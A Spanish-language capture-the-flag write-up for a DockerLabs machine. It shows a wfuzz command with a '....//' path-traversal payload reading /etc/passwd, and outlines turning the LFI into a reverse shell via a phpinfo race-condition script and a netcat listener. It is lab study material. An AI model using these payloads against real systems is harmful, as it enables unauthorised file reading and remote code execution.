---

---
---
- Tags:  #writeup #info #dockerlabs #tutorial 
----
# Reconocimiento

- [x] Puertos *Abiertos*( 80 HTTPS)
- [x] Servicios
- [x] WhatWeb
- [x] Headers
- [x] Gobsuter
- [x] Gobuster Extensiones

----------
# Enumeracion

- **OS**: --

- **Credentials**: -- 

- **Pendientes** --


-----

- ### INFO GRAL
Tenemos solamente una pagina web puerto 80.
Procedemos a hacer una enumeracion de directorios con gobuster o wfuzz

Tenemos un sitio web que reponde y nos pide un supuesto parametro. Lo podemos encontrar con [[wfuzz]]
```bash
wfuzz -c -t 200 --hh=53 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 'http://172.17.0.3/clouddev3lopmentfile.php?FUZZ=....//....//....//....//....//....//....//....//etc/passwd' 
```

El parametro tiene un supuesta sanitizacion tipica de Path Traversal que se puede bypassear con el tipico *....//*
Tenemos un [[Local File Inclusion (LFI)]]!

----
- Por otro lado tambien vemos que esta disponible el *info.php*
- El archivo en la parte de *disable_functions*, no tiene ningun valor, es decir, no hay funciones deshabiltadas (exec,shellexec,passthru,etc)
- Tambien podemos ver la opcion *file_uploads* en *On*, por lo cual es posible subir achivos


------
# Explotacion

### Vias Potenciales Explotacion
- Teniendo un [[Local File Inclusion (LFI)]] y el archivo *info.php*, podemos derivarlo a un atque de [[OWASP/Race Condition]]
- Link al **script** -> [Exploit Python](https://www.insomniasec.com/downloads/publications/phpinfolfi.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo)
- Hay que cambiar unos parametros, como por ejemplo la IP, puerto, REQ1 *"/info.php"*, el LFIREQ *"lfi?=filename=....//....//....//....//....//....//....//....//etc/passwd"*
- Cambiamos tambien en el archivo todo lo que dice *tmp_name*, agregamos el *=&gt*
- Nos ponemos en escucha con *netcat* y ejecutamos el scritpt

```bash
python2.7 phpinfolfi.py <IP> <puerto> <Hilos(recomendado=100)>
```

- De este modo recibiriamos la [[Reverse Shell]]
---------
# Privesc

- [ ] sudo -l
- [ ] history
- [ ] SUID
- [ ] crontab
- [ ] getcap
- [ ] find .txt
- [ ] find .sh
- [ ] id
- [ ] env
- [ ] /opt /tmp
- [ ] pspy, lse, linpeas,etc
- [ ] Kernel Exploits
- [ ] BruteForce Su


------------
